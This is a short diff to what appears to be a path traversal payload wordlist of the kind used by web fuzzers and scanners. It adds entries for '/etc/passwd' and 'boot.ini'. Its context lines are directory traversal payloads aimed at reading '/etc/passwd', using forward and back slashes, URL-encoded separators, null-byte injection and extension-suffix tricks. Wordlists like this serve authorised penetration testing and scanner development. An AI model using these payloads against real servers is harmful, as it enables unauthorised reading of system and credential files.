@@ -1,3 +1,4 @@
+/etc/passwd
 ../../../../../../../etc/passwd
 ..\..\..\..\..\..\..\etc\passwd
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
@@ -1045,6 +1046,7 @@ etc\passwd;index.htm
 ..\..\..\..\..\..\..\etc\passwd%00index.htm
 ..\..\..\..\..\..\..\etc\passwd;index.html
 ..\..\..\..\..\..\..\etc\passwd;index.htm
+boot.ini
 ../../../../../../../etc/passwd
 ..\..\..\..\..\..\..\etc\passwd
 ..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
